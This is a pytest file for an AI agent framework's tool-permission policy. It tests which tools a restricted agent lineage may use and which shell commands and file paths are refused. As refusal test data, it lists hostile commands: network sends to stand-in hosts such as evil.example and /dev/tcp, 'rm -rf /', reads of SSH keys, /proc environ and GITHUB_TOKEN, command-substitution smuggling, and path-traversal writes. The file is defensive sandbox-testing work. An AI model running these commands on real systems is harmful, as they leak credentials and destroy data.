"""F099 section 4.4: what an internal_only turn may be offered, and may do per call.

Pure: no database. The allowed set is pinned as a literal on purpose. A tool
added later fails closed (it is not in the set), and this test is where its
author decides, with a reviewer, whether a lineage may use it.
"""

from __future__ import annotations

import os
import uuid

import pytest

from nous.api.execution_context import CONTEXT_KINDS, ExecutionContext
from nous.api.tool_classes import TOOL_CLASSES
from nous.api.tool_policy import (
    INTERNAL_ONLY_CHECKED_TOOLS,
    INTERNAL_ONLY_DENYLIST,
    INTERNAL_ONLY_LOGGED_TOOLS,
    INTERNAL_ONLY_SPAWN_TOOLS,
    internal_only_allowed,
    internal_only_call_violation,
    lineage_bash_allowed,
)

# Fixed ids: parametrize ids built from them must not change between collections (xdist).
IID, RID, OTHER = (uuid.UUID(f"00000000-0000-0000-0000-00000000000{n}") for n in (1, 2, 3))

# The tools a lineage may be offered when it is not a continuation. A class of
# none or write, not on the denylist, and not a spawn tool.
LINEAGE_ALLOWED = frozenset(
    {
        "recall_deep",
        "recall_recent",
        "read_file",
        "get_procedure",
        "web_search",
        "web_fetch",
        "list_tasks",
        "cache_retrieve",
        "recall_hubs",
        "list_decisions",
        "db_query",  # read-only SQL as a login PostgreSQL holds to SELECT on a fixed list of tables
        "submit_final_report",
        "write_file",
        "learn_fact",
        "record_decision",
        "cancel_task",
        "ingest_document",
    }
)


def _internal(kind: str = "subtask", **over) -> ExecutionContext:
    base = {
        "kind": kind,
        "session_id": "s",
        "authority": "internal_only",
        "intention_id": IID,
        "root_intention_id": RID,
    }
    return ExecutionContext(**{**base, **over})


def _allowed(ctx: ExecutionContext) -> frozenset[str]:
    return frozenset(name for name in TOOL_CLASSES if internal_only_allowed(name, ctx=ctx))


@pytest.mark.parametrize(
    "kind",
    [k for k in CONTEXT_KINDS if k not in ("continuation", "approved_action")],
)
def test_a_lineage_turn_that_is_not_a_continuation_is_offered_exactly_the_pinned_set(kind):
    got = _allowed(_internal(kind))
    assert got == LINEAGE_ALLOWED, (
        f"the internal_only allowed set changed. Added: {sorted(got - LINEAGE_ALLOWED)}; "
        f"removed: {sorted(LINEAGE_ALLOWED - got)}. A tool a lineage may use is a security decision: "
        "update LINEAGE_ALLOWED only with a reviewer's agreement."
    )


def test_a_continuation_is_also_offered_the_two_spawn_tools_until_its_root_is_at_a_limit():
    cont = _internal("continuation")
    assert _allowed(cont) == LINEAGE_ALLOWED | {"spawn_task", "dag_create"}
    assert _allowed(_internal("continuation", spawn_blocked=True)) == LINEAGE_ALLOWED


def test_no_denylisted_external_or_irreversible_tool_is_ever_allowed():
    for kind in CONTEXT_KINDS:
        if kind == "approved_action":
            continue  # not an internal_only context
        allowed = _allowed(_internal(kind))
        assert not allowed & INTERNAL_ONLY_DENYLIST
        assert all(TOOL_CLASSES[n].side_effect in ("none", "write") for n in allowed)
        assert not allowed & {"send_email", "send_file"}


def test_an_unclassified_tool_fails_closed():
    assert internal_only_allowed("a_tool_nobody_classified", ctx=_internal("continuation")) is False


def test_the_denylist_names_only_classified_tools_and_is_the_specs():
    assert INTERNAL_ONLY_DENYLIST <= set(TOOL_CLASSES), "a stale denylist entry guards nothing"
    assert INTERNAL_ONLY_DENYLIST == frozenset(
        {
            "schedule_task",
            "heartbeat_check_create",
            "heartbeat_check_manage",
            "create_censor",
            "learn_skill",
            "store_identity",
            "complete_initiation",
            "dag_manage",
            "push_surface",
            "compose_surface",
            "bash",
            "run_python",
            "spawn_sync",
            "resolve_decision",
            "resolve_decisions",
        }
    )
    assert INTERNAL_ONLY_SPAWN_TOOLS == frozenset({"spawn_task", "dag_create"})
    assert INTERNAL_ONLY_CHECKED_TOOLS == frozenset({"write_file", "cancel_task"})
    assert INTERNAL_ONLY_LOGGED_TOOLS == frozenset({"web_fetch", "web_search"})


# -- per-call rules ---------------------------------------------------------


def _violation(name: str, tool_input: dict, tmp_path, ctx: ExecutionContext | None = None) -> str | None:
    return internal_only_call_violation(ctx or _internal(), name, tool_input, workspace_dir=str(tmp_path))


@pytest.mark.parametrize(
    ("name", "tool_input"),
    [
        ("send_email", {"to": "a@example.com", "subject": "s", "body": "b"}),
        ("send_file", {"path": "x"}),
        ("run_python", {"code": "import smtplib"}),
        ("run_python", {"code": "print(open('https://example.com'))"}),
        ("bash", {"command": "curl https://example.com"}),
    ],
)
def test_a_call_rated_external_is_a_violation_whatever_the_tool(name, tool_input, tmp_path):
    assert _violation(name, tool_input, tmp_path) == "external"


@pytest.mark.parametrize(
    ("name", "tool_input"),
    [("run_python", {"code": "print(1)"}), ("bash", {"command": "ls"}), ("recall_deep", {"query": "x"})],
)
def test_a_local_call_is_not(name, tool_input, tmp_path):
    assert _violation(name, tool_input, tmp_path) is None


def _write(tmp_path, path, ctx=None):
    return _violation("write_file", {"path": path, "content": "x"}, tmp_path, ctx)


def test_write_file_under_the_root_dir_is_allowed(tmp_path):
    assert _write(tmp_path, f"intentions/{RID}/notes.md") is None
    assert _write(tmp_path, f"intentions/{RID}/deep/er/notes.md") is None
    assert _write(tmp_path, str(tmp_path / "intentions" / str(RID) / "abs.md")) is None


@pytest.mark.parametrize(
    "path",
    [
        "notes.md",
        f"intentions/{OTHER}/notes.md",
        f"intentions/{RID}/../{OTHER}/notes.md",
        f"intentions/{RID}/../../outside.md",
        "../outside.md",
        "/etc/passwd",
        "intentions",
        f"intentions/{str(RID)[:8]}/notes.md",
        f"intentions/{RID}-sibling/notes.md",
        # _write omits lineage_shell, so this pins the keyword default as closed.
        "claude-jobs/prompts/x.md",
    ],
)
def test_write_file_outside_the_root_dir_is_refused(tmp_path, path):
    assert _write(tmp_path, path) == "write_path"


def test_write_file_with_no_root_or_no_usable_path_is_refused(tmp_path):
    damaged = _internal(root_intention_id=None, intention_id=None)
    assert _write(tmp_path, f"intentions/{RID}/notes.md", damaged) == "write_path"
    assert _write(tmp_path, "intentions/None/notes.md", damaged) == "write_path"  # str(None) names no root
    for tool_input in ({}, {"path": ""}, {"path": 7}, {"path": "a\x00b"}):
        assert _violation("write_file", tool_input, tmp_path) == "write_path"
    # A NUL byte under the root dir: Windows' realpath swallows it (gh-106242), so only the
    # explicit check refuses it there; Linux's resolve() raises.
    assert _write(tmp_path, f"intentions/{RID}/a\x00b") == "write_path"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_write_file_through_a_symlink_that_leaves_the_root_dir_is_refused(tmp_path):
    root_dir = tmp_path / "intentions" / str(RID)
    root_dir.mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    (root_dir / "link").symlink_to(outside)
    assert _write(tmp_path, f"intentions/{RID}/link/x.md") == "write_path"


# -- write_file under claude-jobs/prompts/ (friction scan F3) -------------------
# prompts/ is writable iff the lineage can launch, i.e. with NOUS_F099_LINEAGE_SHELL. Every test passes the flag
# explicitly; the base has no such keyword.


def _write_with(tmp_path, path, *, lineage_shell, ctx=None):
    return internal_only_call_violation(
        ctx or _internal(),
        "write_file",
        {"path": path, "content": "x"},
        workspace_dir=str(tmp_path),
        lineage_shell=lineage_shell,
    )


def test_write_file_allowed_under_claude_jobs_prompts(tmp_path):
    for path in (
        "claude-jobs/prompts/task.md",
        "claude-jobs/prompts/deep/er/task.md",
        str(tmp_path / "claude-jobs" / "prompts" / "abs.md"),
        f"intentions/{RID}/notes.md",  # PIN: the root's own dir stays writable
    ):
        assert _write_with(tmp_path, path, lineage_shell=True) is None, path


@pytest.mark.parametrize(
    "path",
    [
        "claude-jobs/prompts/../runner.sh",
        "claude-jobs/runner.sh",
        "{W}/claude-jobs/runner.sh",
        "claude-jobs/.claude-home/settings.json",
        "claude-jobs/prompts/../.claude-home/settings.json",
        "claude-jobs/prompts-sibling/task.md",
        "claude-jobs",
        "claude-jobs/prompts/a\x00b",
    ],
)
def test_write_file_prompts_dir_rejects_escapes(tmp_path, path):  # PIN: the base refuses these too
    assert _write_with(tmp_path, path.format(W=tmp_path), lineage_shell=True) == "write_path"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_write_file_prompts_dir_rejects_a_symlink_out(tmp_path):  # PIN: the base refuses it too
    prompts = tmp_path / "claude-jobs" / "prompts"
    prompts.mkdir(parents=True)
    (prompts / "link").symlink_to(tmp_path / "claude-jobs")
    assert _write_with(tmp_path, "claude-jobs/prompts/link/runner.sh", lineage_shell=True) == "write_path"


def test_write_file_into_prompts_is_refused_with_the_lineage_shell_off(tmp_path):  # PIN: the base refuses it too
    assert _write_with(tmp_path, "claude-jobs/prompts/task.md", lineage_shell=False) == "write_path"
    assert _write_with(tmp_path, f"intentions/{RID}/notes.md", lineage_shell=False) is None


def test_write_file_still_refused_without_root(tmp_path):  # PIN: the base refuses it too
    damaged = _internal(root_intention_id=None, intention_id=None)
    assert _write_with(tmp_path, "claude-jobs/prompts/task.md", lineage_shell=True, ctx=damaged) == "write_path"


def test_lineage_write_dirs_are_resolved_and_follow_the_flag(tmp_path):
    from nous.api.tool_policy import lineage_write_dirs

    ws = tmp_path.resolve()
    root_dir, prompts = ws / "intentions" / str(RID), ws / "claude-jobs" / "prompts"
    assert lineage_write_dirs(_internal(), str(tmp_path), lineage_shell=True) == [root_dir, prompts]
    assert lineage_write_dirs(_internal(), str(tmp_path), lineage_shell=False) == [root_dir]
    damaged = _internal(root_intention_id=None, intention_id=None)
    assert lineage_write_dirs(damaged, str(tmp_path), lineage_shell=True) == [prompts]


@pytest.mark.skipif(os.name == "nt", reason="a bash redirect target must start with /")
def test_writable_dirs_shared_with_bash(tmp_path):
    """write_file and the lineage shell's redirections accept the same directories, and refuse the same sibling."""
    from nous.api.tool_policy import lineage_write_dirs

    for d in lineage_write_dirs(_internal(), str(tmp_path), lineage_shell=True):
        assert _write_with(tmp_path, f"{d}/x.md", lineage_shell=True) is None
        assert _shell(f"echo x > {d}/x.md", tmp_path) is None
        assert _write_with(tmp_path, f"{d}-sibling/x.md", lineage_shell=True) == "write_path"
        assert _shell(f"echo x > {d}-sibling/x.md", tmp_path) == "external"


def test_cancel_task_needs_a_uuid_here_and_the_lineage_check_is_the_handlers(tmp_path):
    assert _violation("cancel_task", {"task_id": str(uuid.uuid4())}, tmp_path) is None
    for tool_input in ({}, {"task_id": "not-a-uuid"}, {"task_id": None}, {"task_id": 12}):
        assert _violation("cancel_task", tool_input, tmp_path) == "foreign_cancel"


# -- F099 lineage shell (NOUS_F099_LINEAGE_SHELL) ------------------------------


@pytest.mark.parametrize("kind", ["continuation", "subtask", "dag_node"])
def test_the_lineage_shell_flag_offers_bash_and_nothing_else(kind):
    ctx = _internal(kind)
    shell = frozenset(name for name in TOOL_CLASSES if internal_only_allowed(name, ctx=ctx, lineage_shell=True))
    assert shell == _allowed(ctx) | {"bash"}
    assert "bash" not in _allowed(ctx)  # PIN: flag off is the old surface
    assert "run_python" not in shell and "schedule_task" not in shell and "dag_manage" not in shell


def _shell(command: str, tmp_path, ctx: ExecutionContext | None = None) -> str | None:
    return _violation("bash", {"command": command}, tmp_path, ctx)


def _runner_sh(tmp_path) -> str:
    return f"{tmp_path}/claude-jobs/runner.sh"


@pytest.mark.parametrize(
    "command",
    [
        "{R} launch nous 'Fix the bug [P1]? Costs $5' --model claude-opus-5-5 --effort high",
        "{R} launch nous --prompt-file {W}/claude-jobs/prompts/task.md --model m --base-branch feat/x",
        "{R} launch nous p --plugins {W}/plugins/superpowers/skills/a,{W}/plugins/b",
        "{R} launch nous --prompt-file {W}/intentions/{RID}/prompt.md",
        "{R} status",
        "{R} status job-20261010-222549-6e37c52b",
        "{R} result job-20261010-222549-6e37c52b",
        "{R} list --active",
        "gh pr view 719",
        "gh pr view 719 --json state,mergeable -R tfatykhov/nous",
        "gh pr checks 719",
        "gh run list",
        "gh api repos/tfatykhov/nous/pulls/719 --jq .state",
        "gh api -X GET repos/tfatykhov/nous/pulls --paginate",
        "gh api --method=GET repos/a/b",
        "cd {W}/nous && gh pr view 3 2>&1 | head -20",
        "cat {W}/a.md; ls -la {W} | grep x || true",
        "printf 'job %s' x > {W}/intentions/{RID}/notes.md",
        "echo hi >> {W}/claude-jobs/prompts/p.md 2>/dev/null",
        "cat > {W}/claude-jobs/prompts/p.md <<'EOF'\nraw $HOME `id` text\nEOF\n"
        "{R} launch nous --prompt-file {W}/claude-jobs/prompts/p.md",
        "sleep 30 && {R} status job-20261010-222549-6e37c52b",
        "bash {R} status",  # exactly bash and the runner's path (test_f099_lineage_shell_obstacles has the rest)
    ],
)
def test_the_lineage_shell_allows_the_delegation_path_and_reads(command, tmp_path):
    command = command.format(R=_runner_sh(tmp_path), W=tmp_path, RID=RID)
    assert _shell(command, tmp_path) is None


@pytest.mark.parametrize(
    "command",
    [
        # outward or destructive
        "gh pr merge 719",
        "gh pr comment 719 -b hi",
        "gh pr view 719 --web",
        "gh pr checks 719 --watch",
        "git push origin main",
        "git status",
        "curl -X POST http://localhost:8000/intentions/proposals/x/decide",
        "curl https://example.com",
        "rm -rf /tmp/x",
        "mail -s hi a@example.com",
        "python3 -c 'print(1)'",
        "tee {W}/claude-jobs/prompts/p.md",
        # gh api that writes, or can
        "gh api -X POST repos/a/b/issues",
        "gh api repos/a/b/issues -f title=x",
        "gh api repos/a/b/issues --input body.json",
        "gh api -H 'X-HTTP-Method-Override: POST' repos/a/b",
        "gh api graphql -f query=x",
        "gh api https://evil.example/x",
        "gh api --hostname evil.example repos/a/b",
        # chains, substitutions, wrappers
        "{R} launch x p; curl -X POST http://example.com",
        "{R} status && rm -rf /",
        "gh pr view 1 | sh",
        "echo $(curl http://example.com)",
        "echo `id`",
        'ls "$(id)"',
        "ls $HOME",
        "(ls)",
        "{{ ls; }}",
        "ls &",
        "bash -c ls",
        "sudo ls",
        "env ls",
        "X=1 ls",
        "eval ls",
        "ls *",
        "cat ~/.ssh/id_rsa",
        "cat > {W}/claude-jobs/prompts/p.md <<EOF\n$(id)\nEOF",
        "echo 'unbalanced",
        "",
        "   ",
        # runner.sh arguments
        "{R} launch nous p --sys-prompt x",
        "{R} launch nous p --plugins /tmp/evil",
        "{R} launch nous p --plugins {W}/plugins/../claude-jobs",
        '{R} launch "nous\'x" p',
        "{R} launch nous --prompt-file /etc/shadow",
        "{R} launch nous -p",
        "{R} launch nous p --model",
        '{R} launch nous p --model "m\'x"',
        "{R} cleanup job-20261010-222549-6e37c52b",
        "{R} gc",
        # cancel is not allowed: no ownership check (see #725)
        "{R} cancel job-20261010-222549-6e37c52b",
        "{R} status ../../x",
        "{R}",
        "./runner.sh status",  # the cwd is the workspace, not claude-jobs
        # writes outside the two directories
        "printf x > {R}",
        "printf x > {W}/claude-jobs/prompts/../runner.sh",
        "printf x > {W}/intentions/{OTHER}/notes.md",
        "cat a > {W}/a",
        "echo x > relative.txt",
        "echo x > /dev/tcp/example.com/80",
        "cat < /dev/tcp/example.com/80",
        "cat 0</dev/udp/example.com/53",
        "grep x <> /dev/tcp/example.com/80",
        "cat <<< x < //dev/tcp/example.com/80",
        "cat >&/dev/tcp/example.com/80",
        "echo x >&{W}/a",
    ],
)
def test_the_lineage_shell_refuses_everything_else_as_external(command, tmp_path):
    command = command.format(R=_runner_sh(tmp_path), W=tmp_path, RID=RID, OTHER=OTHER)
    assert _shell(command, tmp_path) == "external"


def test_the_lineage_shell_refuses_a_call_with_no_usable_command(tmp_path):
    for tool_input in ({}, {"command": None}, {"command": ["ls"]}, {"cmd": "ls"}):
        assert _violation("bash", tool_input, tmp_path) == "external"


def test_a_lineage_with_no_root_may_write_only_to_the_prompts_dir(tmp_path):
    damaged = _internal(root_intention_id=None, intention_id=None)
    assert _shell(f"echo x > {tmp_path}/claude-jobs/prompts/p.md", tmp_path, damaged) is None
    assert _shell(f"echo x > {tmp_path}/intentions/None/p.md", tmp_path, damaged) == "external"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_a_lineage_shell_write_through_a_symlink_that_leaves_the_dir_is_refused(tmp_path):
    prompts = tmp_path / "claude-jobs" / "prompts"
    prompts.mkdir(parents=True)
    (prompts / "link").symlink_to(tmp_path)
    assert _shell(f"echo x > {prompts}/link/runner.sh", tmp_path) == "external"


# -- P1/P2 from #723 (Codex findings, issue #725) -------------------------------


def test_lineage_cancel_is_not_allowed(tmp_path):
    """A continuation must not be able to cancel a runner job by ID alone — no ownership check."""
    ctx = _internal()
    workspace = str(tmp_path)
    runner = f"{workspace}/claude-jobs/runner.sh"
    assert not lineage_bash_allowed(ctx, f"{runner} cancel job-20260101-120000-abcd1234", workspace_dir=workspace)


def test_lineage_status_and_result_still_allowed(tmp_path):
    """status and result (read-only) should still work for a well-formed job ID."""
    ctx = _internal()
    workspace = str(tmp_path)
    runner = f"{workspace}/claude-jobs/runner.sh"
    for action in ("status", "result"):
        assert lineage_bash_allowed(ctx, f"{runner} {action} job-20260101-120000-abcd1234", workspace_dir=workspace)


def test_printf_v_is_blocked(tmp_path):
    """printf -v VAR can override exported variables on bash — must be rejected."""
    ctx = _internal()
    workspace = str(tmp_path)
    for cmd in [
        "printf -v PATH /attacker/dir",
        "printf -vPATH /attacker/dir",
    ]:
        assert not lineage_bash_allowed(ctx, cmd, workspace_dir=workspace)


def test_printf_without_v_is_allowed(tmp_path):
    """printf without -v is fine (writes to stdout only)."""
    ctx = _internal()
    workspace = str(tmp_path)
    assert lineage_bash_allowed(ctx, "printf '%s\\n' hello", workspace_dir=workspace)


def test_printf_v_is_only_an_option_in_the_leading_option_position(tmp_path):
    """#727: only a LEADING -v assigns; after the format, or after --, it is an argument printf prints."""
    ctx = _internal()
    workspace = str(tmp_path)
    for cmd in ["printf '%s' -value", "printf -- '%s' -v", "printf '%s %s' a -v", "printf -- -v"]:
        assert lineage_bash_allowed(ctx, cmd, workspace_dir=workspace), cmd
    for cmd in ["printf -v x hi", "printf -vx hi", "printf -nv x hi"]:
        assert not lineage_bash_allowed(ctx, cmd, workspace_dir=workspace), cmd


@pytest.mark.parametrize("op", ["&>", "&>>"])
def test_the_lineage_shell_refuses_the_bash_only_redirect_of_both_streams(op, tmp_path):
    """dash, prod's /bin/sh, reads `cat a &>f` as `cat a &` and then `>f`: a backgrounded command."""
    assert _shell(f"cat {tmp_path}/a.md {op} {tmp_path}/intentions/{RID}/n.md", tmp_path) == "external"


# -- post-merge review P1-1: read arguments stay under the workspace -------------


@pytest.mark.parametrize(
    "command",
    [
        # the review's probes
        "cat /proc/self/environ",
        "grep -r TOKEN /proc/1/environ",
        "cat /etc/passwd",
        "cat ../x",
        "cat .ssh/id_rsa",
        "cd claude-jobs; cat .claude-home/oauth-token",
        # hidden components, absolute or relative
        "cat {W}/.ssh/id_rsa",
        "cat claude-jobs/.claude-home/oauth-token",
        "head -n 5 bitsgap/.secrets/key",
        "tail -c 10 .env",
        "wc -l .nous-undo/x",
        "ls .ssh",
        "ls /",
        "ls ..",
        "cat '~/x'",
        "ls '~'",
        "cat x -- /etc/passwd",
        "cat -- /etc/passwd",
        "head -5 ../x",
        "wc --files0-from=list",
        "wc --files0-from list",
        # cd
        "cd",
        "cd -",
        "cd '~'",
        "cd /etc",
        "cd ..",
        "cd .ssh",
        "cd claude-jobs/.claude-home",
        "cd -P /etc",
        "cd a b",
        "cd /etc && cat passwd",
        # grep: files, pattern files, recursion
        "grep x /proc/1/environ",
        "grep -e x /etc/passwd",
        "grep -ie x /etc/passwd",
        "grep -f /etc/passwd x",
        "grep -f/etc/passwd x",
        "grep -if /etc/passwd x",
        "grep --file=/proc/self/environ x",
        "grep --file /proc/self/environ x",
        "grep --exclude-from=/etc/x y z",
        "grep -r TOKEN .",
        "grep -R x claude-jobs",
        "grep -rn x .",
        "grep -nr x .",
        "grep --recursive x .",
        "grep --dereference-recursive x .",
        "grep --rec x .",
        "grep -d recurse x .",
        "grep -drecurse x .",
        "grep --directories=recurse x .",
        "grep --directories recurse x .",
        "grep -e x -- .ssh/id_rsa",
        # jq: data files, program files, imports, env
        "jq . /etc/passwd",
        "jq '.a' .ssh/k.json",
        "jq --rawfile x /proc/self/environ -n '$x'",
        "jq -n --slurpfile x .ssh/k.json '$x'",
        "jq -n '$x' --rawfile x /etc/passwd",
        "jq -f /etc/x",
        "jq -f intentions/{RID}/p.jq",
        "jq --from-file intentions/{RID}/p.jq",
        "jq -nf intentions/{RID}/p.jq",
        "jq --args -n '$ARGS' x",
        "jq --jsonargs -n '$ARGS' 1",
        "jq -L /etc -n 1",
        "jq --run-tests x",
        'jq -n \'import "c" as $c {{search: "/root"}}; $c\'',
        "jq -n 'include \"c\"; 1'",
        "jq -n '$ENV'",
        "jq -n 'env.GITHUB_TOKEN'",
        # an input redirection is a read too, whatever the command
        "cat < /proc/self/environ",
        "grep x < .ssh/id_rsa",
        "jq . 0</etc/passwd",
        "echo < /etc/shadow",
        "cd claude-jobs; cat < .claude-home/oauth-token",
    ],
)
def test_the_lineage_shell_refuses_a_read_outside_the_workspace_or_into_a_hidden_dir(command, tmp_path):
    command = command.format(W=tmp_path, RID=RID)
    assert _shell(command, tmp_path) == "external"


@pytest.mark.parametrize(
    "command",
    [
        "jq '.items[0]' intentions/{RID}/r.json",
        "jq -r '.a' {W}/intentions/{RID}/r.json",
        "jq '.a' intentions/{RID}/r.json --indent 2",
        "jq -n --arg x /etc/passwd '$x'",
        "jq -n --argjson x 1 '$x'",
        "jq --rawfile t intentions/{RID}/t.txt -n '$t'",
        "jq -nr '1'",
        "jq -R . intentions/{RID}/log.txt",
        "grep -n error intentions/{RID}/log.txt",
        "grep -e .ssh -n intentions/{RID}/log.txt",
        "grep -A 3 -i error intentions/{RID}/log.txt",
        "grep -c -e x -e y claude-jobs/a.log claude-jobs/b.log",
        "grep -f intentions/{RID}/patterns.txt claude-jobs/a.log",
        "grep --color=never -m2 x claude-jobs/a.log",
        "gh pr view 1 | grep -n state",
        "cat claude-jobs/prompts/p.md",
        "cat ./claude-jobs/prompts/p.md -",
        "head -n 5 intentions/{RID}/log.txt",
        "tail -20 claude-jobs/x.log",
        "tail --lines=3 claude-jobs/x.log",
        "wc -l claude-jobs/prompts/p.md",
        "ls",
        "ls -la",
        "ls -la claude-jobs/prompts",
        "cd claude-jobs && ls prompts",
        "cd {W}/intentions/{RID} && cat r.json",
        "cd intentions; cd {RID}; jq . r.json",
        "echo ../.ssh /etc/passwd",
        "pwd; sleep 1; true",
        "jq .a < intentions/{RID}/r.json",
        "cat < /dev/null",
    ],
)
def test_the_lineage_shell_still_allows_reads_under_the_workspace(command, tmp_path):
    command = command.format(W=tmp_path, RID=RID)
    assert _shell(command, tmp_path) is None


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_a_relative_read_is_checked_from_every_directory_an_earlier_cd_could_reach(tmp_path):
    """`x` is harmless from the workspace, but after `cd sub` it is a link to a key."""
    (tmp_path / ".ssh").mkdir()
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "x").symlink_to(tmp_path / ".ssh" / "id_rsa")
    assert _shell("cat x", tmp_path) is None
    assert _shell("cd sub; cat x", tmp_path) == "external"
    assert _shell("cd sub || true; head x", tmp_path) == "external"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_a_read_or_cd_through_a_symlink_into_a_hidden_dir_is_refused(tmp_path):
    (tmp_path / ".ssh").mkdir()
    (tmp_path / "ok").mkdir()
    (tmp_path / "ok" / "link").symlink_to(tmp_path / ".ssh")
    assert _shell("cat ok/link/id_rsa", tmp_path) == "external"
    assert _shell("cd ok/link", tmp_path) == "external"
    assert _shell("ls ok", tmp_path) is None


def _deep_link_workspace(tmp_path):
    """The review's workspace: ``ws/l`` is a plain-named link to a deeper directory, and a file sits outside."""
    ws = tmp_path / "ws"
    root_dir = ws / "intentions" / str(RID)
    root_dir.mkdir(parents=True)
    (ws / "l").symlink_to(root_dir)
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside" / "secret.txt").write_text("outside-secret")
    (ws / "intentions" / "x").write_text("physical-parent")
    (ws / "x").write_text("logical-parent")
    (root_dir / "x.md").write_text("root-file")
    return ws


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
@pytest.mark.parametrize(
    "command",
    [
        "cd l/../..; cat outside/secret.txt",
        "cd intentions/{RID}/../../l/../..; cat x",
        "cd l; cd ..; cat x",
        "cd ..",
        "cd l/..",
        "cd -L intentions",
        "cd -P intentions",
    ],
)
def test_a_cd_target_with_a_dotdot_component_is_refused(command, tmp_path):
    """dash's cd resolves `..` LOGICALLY (l/.. is the directory l sits in), the policy physically (l/.. is the
    link target's parent), so `cd l/../..` would leave the workspace while the policy saw it stay inside."""
    ws = _deep_link_workspace(tmp_path)
    assert _violation("bash", {"command": command.format(RID=RID)}, ws) == "external"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks and /bin/sh")
def test_a_read_after_cd_through_a_link_is_judged_from_the_physical_directory_the_kernel_reads(tmp_path):
    """A read argument's `..` is resolved by the kernel from the PHYSICAL cwd, as the policy resolves it."""
    import subprocess

    ws = _deep_link_workspace(tmp_path)

    def sh(command: str) -> str:
        return subprocess.run(["/bin/sh", "-c", command], cwd=ws, capture_output=True, text=True).stdout

    assert _violation("bash", {"command": f"cd intentions/{RID}; cat x.md"}, ws) is None
    assert _violation("bash", {"command": "cd l; cat x.md"}, ws) is None
    assert sh("cd l; cat x.md") == "root-file"
    # `../x` after `cd l` is ws/intentions/x to the kernel, not ws/x: the physical base, as the policy has it.
    assert sh("cd l; cat ../x") == "physical-parent"
    # Still refused: from the workspace, another directory the shell may be in, `../x` leaves it.
    assert _violation("bash", {"command": "cd l; cat ../x"}, ws) == "external"


@pytest.mark.parametrize(
    "command",
    [
        "gh api repos/a/b --jq '$ENV.GITHUB_TOKEN'",
        "gh api repos/a/b --jq='$ENV.GITHUB_TOKEN'",
        "gh pr view 1 --json title -q 'env'",
        "gh pr view 1 --json title -q'env.GITHUB_TOKEN'",
        "gh pr view 1 --json title -cq 'env'",
        "gh api repos/a/b -q 'import \"x\" as $x; $x'",
    ],
)
def test_a_gh_jq_filter_that_reads_the_environment_is_refused(command, tmp_path):
    """gh runs --jq with gojq, which reads the environment, and GITHUB_TOKEN is left in a lineage's."""
    assert _shell(command, tmp_path) == "external"


@pytest.mark.parametrize(
    "command",
    ["gh api repos/a/b --jq '.title'", "gh pr view 1 --json title -q .title", "gh pr view 1 --json title --jq=.title"],
)
def test_an_ordinary_gh_jq_filter_is_still_allowed(command, tmp_path):
    assert _shell(command, tmp_path) is None


# -- post-merge review P1-1: a lineage's bash runs with an allowlisted environment ---


def _bash_dispatcher(tmp_path):
    from types import SimpleNamespace

    from nous.api.builtin_tools import register_builtin_tools
    from nous.api.tools import ToolDispatcher

    d = ToolDispatcher()
    register_builtin_tools(d, SimpleNamespace(workspace_dir=str(tmp_path / "ws")))
    return d


@pytest.mark.skipif(os.name == "nt", reason="a POSIX shell and printenv")
async def test_a_lineage_bash_call_sees_only_the_allowlisted_environment(tmp_path, monkeypatch):
    monkeypatch.setenv("NOUS_TEST_PLANTED_SECRET", "planted-s3cret")
    monkeypatch.setenv("GITHUB_TOKEN", "planted-gh-token")
    d = _bash_dispatcher(tmp_path)
    command = "printenv NOUS_TEST_PLANTED_SECRET; printenv GITHUB_TOKEN; printenv PATH"
    text, _ = await d.dispatch("bash", {"command": command}, context=_internal("continuation"))
    assert "planted-s3cret" not in text
    # Kept on purpose: gh authenticates only through it, and runner.sh launch hands it to the job.
    assert "planted-gh-token" in text
    assert os.environ["PATH"] in text
    # The model cannot switch the scrub off: an argument named with "_" is the dispatcher's.
    text, _ = await d.dispatch("bash", {"command": command, "_lineage": False}, context=_internal("continuation"))
    assert "planted-s3cret" not in text


def _gh_repo_dispatcher(tmp_path, settings=None):
    from types import SimpleNamespace

    from nous.api.builtin_tools import register_builtin_tools
    from nous.api.tools import ToolDispatcher

    d = ToolDispatcher()
    stub = SimpleNamespace(workspace_dir=str(tmp_path / "ws"), github_default_repo="a/b")
    register_builtin_tools(d, settings or stub)
    return d


@pytest.mark.skipif(os.name == "nt", reason="a POSIX shell and printenv")
async def test_a_lineage_bash_call_gets_gh_repo_from_the_setting_not_the_process(tmp_path, monkeypatch):
    from nous.config import Settings

    monkeypatch.setenv("GH_REPO", "evil/x")
    text, _ = await _gh_repo_dispatcher(tmp_path).dispatch(
        "bash", {"command": "printenv GH_REPO"}, context=_internal("continuation")
    )
    assert "a/b" in text and "evil/x" not in text
    settings = Settings(_env_file=None, ANTHROPIC_API_KEY="k", workspace_dir=str(tmp_path / "ws"))
    text, _ = await _gh_repo_dispatcher(tmp_path, settings).dispatch(
        "bash", {"command": "printenv GH_REPO"}, context=_internal("continuation")
    )
    assert "tfatykhov/nous" in text and "evil/x" not in text  # the default


def test_a_build_command_gets_no_gh_repo(monkeypatch):
    from nous.api.builtin_tools import _lineage_env

    monkeypatch.setenv("GH_REPO", "evil/x")
    assert _lineage_env(False, "a/b")["GH_REPO"] == "a/b"
    assert "GH_REPO" not in _lineage_env(True, "a/b")  # gh needs the token, which a build command does not get
    assert "GH_REPO" not in _lineage_env(False, "")  # no setting: none, and never the process's


@pytest.mark.skipif(os.name == "nt", reason="a POSIX shell and printenv")
@pytest.mark.parametrize("ctx", [None, ExecutionContext(kind="subtask", session_id="s")])
async def test_a_bash_call_outside_a_lineage_does_not_get_gh_repo(tmp_path, monkeypatch, ctx):
    monkeypatch.delenv("GH_REPO", raising=False)
    text, _ = await _gh_repo_dispatcher(tmp_path).dispatch("bash", {"command": "printenv GH_REPO"}, context=ctx)
    assert "a/b" not in text


@pytest.mark.skipif(os.name == "nt", reason="a POSIX shell and printenv")
@pytest.mark.parametrize("ctx", [None, ExecutionContext(kind="subtask", session_id="s")])
async def test_a_bash_call_outside_a_lineage_keeps_the_full_environment(tmp_path, monkeypatch, ctx):
